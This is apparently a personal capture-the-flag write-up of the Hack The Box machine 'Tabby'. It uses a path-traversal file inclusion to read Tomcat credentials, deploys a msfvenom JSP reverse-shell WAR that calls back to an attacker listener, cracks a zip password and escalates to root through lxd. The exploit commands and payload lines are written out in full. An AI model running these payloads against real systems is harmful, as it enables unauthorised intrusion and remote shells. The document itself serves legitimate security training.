---
title: "Tabby"
categories:
 - hackthebox
tags:
 - linux
 - easy
 - writeups
author_profile: true
---

Test Room

[Easy-Linux-Room](https://www.hackthebox.eu/home/machines/profile/259)

> IP 10.10.10.194

#### nmap
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

#### gobuster
```
/files
    /archive
    /statement
/assets
    /images
```

#### port 8080
tomcat 9 is running, any exploits ?

#### statement
We apologise to all our customers for the previous data breach.

We have changed the site to remove this tool, and have invested heavily in more secure servers

Found: _http://megahosting.htb/news.php?file=statement_

> add megahosting.htb to /etc/hosts

> The file parameter has lfi 

Are creds of tomcat server stored in some file ?

`file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml`
```
 <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```
Now since we have creds, look for if we can get RCE

#### tomcat RCE using creds
For some reasons msf exploit had problem with some fingerprint not matching with tomcat, idk
So can we connect to it with available creds ? 

I think I got what I needed, `tomcatmanager: is a a command line tool and python library for managing a tomcat server `
It didn't work either.

So went through docs to find, you can deploy add delete start stop server,

Create a rev_shell using msfvenom and add it to a path, listen to nc and curl the path to get shell.
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.15.88 port=4444 -f war > shell.war
curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/rev_shell'
# or tomcat-manager worked deploying but no shell  
tomcat-manager --user=tomcat --password=$3cureP4s5w0rd123! http://megahosting.htb:8080/manager deploy local shell.war /shell

curl -u 'tomcat':'$3cureP4s5w0rd123!' http://megahosting.htb:8080/shell/
```
**Note**: Learnt sth interesting, all above errors I was getting was probably due to how "$ behaves in bash. 
```
# try 
echo $3cureP4s5w0rd123!
echo "$3cureP4s5w0rd123!"
echo '$3cureP4s5w0rd123!'
# got it ? haha dope
```
#### Enumeration 
we find a backup file unzipping it asks for password

crack the password using `fcrackzip`

The unzipped directory didn't have anycredentials, is the password of ash ? Yeah ...

#### Privilege Escalation
The user has lxd group, so tried lxd privilege escalation, got a error since lxd wasn't initiated, init it and do it again to get root.

**Rooted**











